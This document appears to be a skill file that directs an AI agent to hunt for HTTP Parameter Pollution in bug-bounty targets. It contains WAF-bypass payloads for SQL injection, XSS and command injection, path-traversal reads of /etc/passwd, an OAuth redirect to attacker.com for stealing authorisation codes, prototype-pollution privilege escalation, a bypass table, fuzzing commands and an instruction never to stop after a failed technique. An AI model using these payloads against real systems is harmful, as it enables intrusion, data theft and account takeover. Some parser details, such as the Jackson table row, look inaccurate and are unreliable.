---
name: hunt-parameter-pollution
description: "Use this skill on ANY endpoint with parameters — HTTP Parameter Pollution (HPP) is a primitive that bypasses WAFs, auth checks, and access-control filters by exploiting parser disagreement between layers. Load automatically when you've fingerprinted the backend tech (PHP, .NET, Node, Java, Python) and there's a proxy/CDN/WAF in front. Also load when you see JSON bodies with potentially-duplicated keys. Only invoke if real impact potential exists — HPP without a downstream win (WAF bypass, auth bypass, IDOR, parser-differential RCE) is not a finding."
type: hunt
---

# Hunt: HTTP PARAMETER POLLUTION (HPP)

When the same parameter name appears twice, every layer (WAF, app server, application code, ORM) may pick a different value. Exploitation = finding two layers that disagree on which value to trust.

## Crown Jewel Targets
- WAF bypass for SQLi/XSS — WAF sees safe value, app sees malicious value
- Auth bypass — `user_id=victim&user_id=attacker` with backend taking first, ACL taking last
- IDOR — array-index confusion (`ids[]=1&ids[]=2&ids[]=99999`)
- 2FA/MFA bypass — repeat `otp=` to bypass replay window
- JSON parser differential — Express vs Go vs Python parsing duplicate keys differently (2024 PortSwigger research)
- Cache poisoning — proxy keys on first value, origin serves based on last
- OAuth `redirect_uri` confusion (often paid Critical on H1)

## Detection Signals
- Any endpoint with GET/POST params
- WAF/CDN headers: `cloudflare`, `akamai`, `incapsula`, `awselb`, `x-cdn`, `varnish`
- Microservice architecture (multiple parsers in chain — gateway → service mesh → app)
- JSON body on critical endpoints (auth, payment, role-change)
- GraphQL with array variables
- OpenAPI / Swagger showing array params

## Server Behavior Table (memorize this)
| Stack | Duplicate `?a=1&a=2` returns |
|-------|----------------------------|
| PHP (`$_GET['a']`) | `2` (last) |
| Apache (mod_perl) | `1` (first) |
| ASP / IIS classic | `1,2` (concat-comma) |
| ASP.NET (`Request.QueryString["a"]`) | `1,2` (concat-comma) |
| ASP.NET Core (default model binding) | `1` (first), array binds as `[1,2]` |
| Node.js / Express (`req.query.a`) | `['1','2']` (array) |
| Java Servlet `getParameter` | `1` (first) |
| Java Servlet `getParameterValues` | `['1','2']` |
| Spring `@RequestParam String a` | `1,2` (concat-comma) |
| Python Flask `request.args.get` | `1` (first) |
| Python Flask `request.args.getlist` | `['1','2']` |
| Python Django `request.GET['a']` | `2` (last) |
| Ruby on Rails | `2` (last) |
| Golang `r.URL.Query().Get` | `1` (first) |
| Perl CGI | array (depends on context) |
| Nginx (passes both untouched) | depends on upstream |
| AWS API Gateway | last value |
| Cloudflare WAF | inspects both, but may rate-limit differently |

## Attack Techniques

### 1. WAF bypass — SQLi/XSS through value-splitting
WAF inspects each value individually; app concatenates.
```
?id=1&id=union+select+1,2,3--          ← ASP.NET concat → '1,union select 1,2,3--'
?q=<script&q=>alert(1)</script>        ← split-tag bypass
?cmd=ls&cmd=;cat /etc/passwd            ← OS command split
```

### 2. Auth bypass — privilege escalation
```
?role=user&role=admin                  ← if last wins after ACL check on first
POST /api/account
user_id=victim&user_id=attacker        ← session vs business-logic disagree
```

### 3. Array index IDOR
```
?ids[]=1&ids[]=2&ids[]=999999          ← backend fetches all in batch — leaks other-user data
?file[]=invoice.pdf&file[]=../../etc/passwd
```

### 4. Session/CSRF token bypass
```
?csrf=stolen&csrf=anything              ← if validator checks first, app uses last
Cookie: session=A; session=B            ← cookie HPP — proxy and app differ
```

### 5. OAuth redirect_uri confusion
```
?client_id=...&redirect_uri=https://attacker.com&redirect_uri=https://legit.com
```
Authorization server validates `legit.com` (last), but redirects to `attacker.com` (first) on some implementations. Steals auth code.

### 6. JSON parameter pollution (2024 PortSwigger / Bishop Fox)
Duplicate keys in JSON — parsers diverge:
```json
{"user":"victim","user":"attacker"}
```
| Parser | Result |
|--------|--------|
| Node `JSON.parse` | last wins (`attacker`) |
| Go `encoding/json` | last wins |
| Python `json.loads` | last wins |
| Java Jackson (default) | last wins |
| Java Jackson `FAIL_ON_TRAILING_TOKENS` | error |
| Ruby `JSON.parse` | last wins |
| PHP `json_decode` | last wins |
| .NET Json.NET | last wins |
| .NET `System.Text.Json` | throws (strict) |

Use case: gateway validates `{"user":"victim"}` (parses to "victim"), backend uses different parser that returns the malicious value. Common between API gateway (Go) and service (.NET strict) — strict throws → falls back to gateway-validated payload.

### 7. HTTP parameter smuggling via mixed encoding
```
?user=alice&user[]=bob                  ← scalar/array confusion
?user=alice&user.role=admin             ← object-path injection (Ruby on Rails Strong Params bypass)
```

### 8. Cookie pollution
```
Cookie: tracking=A; session=B; tracking=C
```
Reverse proxy may keep first, app may keep last. Useful for cache poisoning + auth confusion.

## Payloads
```
# Generic — try every combo
?param=safe&param=malicious
?param=malicious&param=safe
?param[]=safe&param[]=malicious
?param=safe%26param=malicious           ← URL-encoded second & survives one decoding pass
?param[0]=safe&param[1]=malicious
?param.subkey=value                      ← object injection
?param[__proto__][isAdmin]=true          ← Node.js prototype pollution via HPP

# JSON
{"x":1,"x":2}
{"x":1,\n"x":2}
{"x":1, "x ":2}                          ← trailing-space key (some parsers strip)
{"x":1,"X":2}                            ← case differential (Jackson case-insensitive)

# Header HPP
X-Forwarded-For: 1.1.1.1
X-Forwarded-For: 127.0.0.1

# Cookie HPP
Cookie: session=victim
Cookie: session=attacker
```

## Bypass Methods
| Defense | Bypass |
|---------|--------|
| WAF inspects single param | HPP split malicious payload across multiple `param=` |
| Strict JSON parser | Use HPP via query string instead; or use whitespace/case key variants |
| Allowlist on first value | Add second value with attacker payload (last-wins stack) |
| Allowlist on last value | Prepend attacker payload (first-wins stack) |
| Param-name normalization | Use array notation `param[]`, object `param[a]`, dotted `param.a` |

## Tools
```bash
# Burp Param Miner — auto-detect HPP differentials
# Burp HTTP Smuggler — HPP via header smuggling

# Manual differential check
for stack in expected_first expected_last expected_array; do
  curl -s "https://target/api?id=1&id=2" -o /tmp/r1; cat /tmp/r1
done

# ParamSpider for finding parameterized URLs
paramspider -d target.com

# Arjun for param discovery
arjun -u https://target.com/endpoint

# wfuzz HPP
wfuzz -z list,'a=1&a=2-a=2&a=1-a[]=1&a[]=2' -u 'https://target/?FUZZ'
```

## Impact
- **Critical** — auth bypass, OAuth code theft, SQLi/RCE via WAF bypass
- **High** — IDOR via array pollution, MFA bypass, parser-differential RCE chain
- **Medium** — WAF bypass enabling Medium-severity bug
- **Low** — HPP without downstream win (do not submit alone)

## Chain Potential
- HPP → WAF bypass → SQLi (escalates Medium SQLi to Critical RCE)
- HPP → OAuth redirect_uri confusion → auth code theft → ATO
- JSON HPP → access control bypass between gateway and microservice → admin action as low user
- Cookie HPP → cache poisoning → mass session theft
- Prototype-pollution via HPP (`?__proto__[isAdmin]=1`) → privilege escalation in Node apps

## Fallback Chain
1. If `?a=1&a=2` returns one value, try array `?a[]=1&a[]=2`, object `?a[x]=1`, and dotted `?a.x=1` notations — each reveals a different parser.
2. If query-string HPP fails, move to body HPP (form-encoded, multipart, JSON duplicate keys, XML duplicate elements).
3. If body HPP fails, try header HPP (`X-Forwarded-For` duplicated, `Host` duplicated for routing confusion) and cookie HPP (multiple `session=` cookies).
4. If detection alone yields no impact, chain HPP with a Medium bug (WAF-blocked SQLi/XSS) to escalate severity. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

Note: HPP is a sparse class in public datasets and almost always reported as a chain ingredient.

| Title (truncated) | Program | Bounty | Source |
|---|---|---|---|
| **Parameter pollution in social sharing buttons** | HackerOne | $500 | H1 |
| HPP with semicolons in iframe → loading external Greenhouse forms | Status.im | $100 | H1 |
| owncloud.com Parameter pollution in social sharing | ownCloud | $0 | H1 |
| Bypassing Digits web auth host validation with HPP | X / xAI | $0 | H1 |
| HTTP parameter pollution from outdated Greenhouse.io JS | Slack | $0 | H1 |
| DOM XSS via parameter pollution on biz.mail.ru | Mail.ru | $0 | H1 |
| Cross Site Scripting on IRCCloud Badges via HPP | IRCCloud | $0 | H1 |
| HPP using semicolons in iframe at hackerone.com/careers | HackerOne | $0 | H1 |
| DoS through cache poisoning using invalid HTTP parameters | Greenhouse.io | $0 | H1 |
| XSS via Parameter Pollution at glassdoor.com/Search | Glassdoor | $0 | H1 |
| Misconfigured CORS led to HPP and SOP bypass | BTFS | $0 | H1 |

**PROVEN patterns** (3+ reports): semicolon-separator HPP in iframe-loaded third-party JS (HackerOne, Status.im, Slack — all Greenhouse.io chain), HPP bypassing host/origin validation (X/xAI Digits, BTFS), HPP enabling XSS by smuggling second value past first-value sanitizer (Glassdoor, IRCCloud, Mail.ru).

## High-Value Chains (from Reports)

1. **HPP → WAF/sanitizer bypass → XSS**
   - Glassdoor (Search/results.htm), IRCCloud Badges, Mail.ru biz.mail.ru — first param value was sanitized, second was reflected unfiltered into DOM.
2. **HPP → host-validation bypass → OAuth/CSRF protection bypass**
   - X / xAI Digits — duplicated `host=` confused the validator, allowed cross-origin auth flow takeover primitive.
3. **HPP in 3rd-party JS dependency (Greenhouse) → XSS on multiple programs**
   - HackerOne careers, Slack, Status.im — same vulnerable third-party widget loaded with semicolon-style HPP across many tenants.
4. **HPP on cache key → cache poisoning DoS**
   - Greenhouse.io — invalid duplicated params poisoned shared cache, served broken page to all visitors.
5. **HPP + CORS misconfig → SOP bypass**
   - BTFS — duplicated origin param chained with permissive CORS for cross-origin read.
